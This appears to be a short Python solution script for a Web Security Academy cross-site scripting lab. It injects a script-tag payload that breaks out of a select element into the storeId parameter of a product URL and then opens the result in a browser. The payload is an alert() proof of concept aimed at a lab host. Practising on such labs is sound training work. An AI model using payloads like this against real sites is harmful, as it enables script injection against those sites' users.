import requests
import webbrowser

base_url = 'https://LAB-ID.web-security-academy.net/' # Replace with your actual lab ID
payload = "\"></select><script>alert()</script>"
url = f'{base_url}product/?productId=1&storeId={payload}'

response = requests.get(url=url)

print("Response Status:", response.status_code)
if response.status_code == 200:
    print("Payload successfully submitted!")
    print(response.url)
    webbrowser.open(response.url)
else:
    print("Something went wrong.")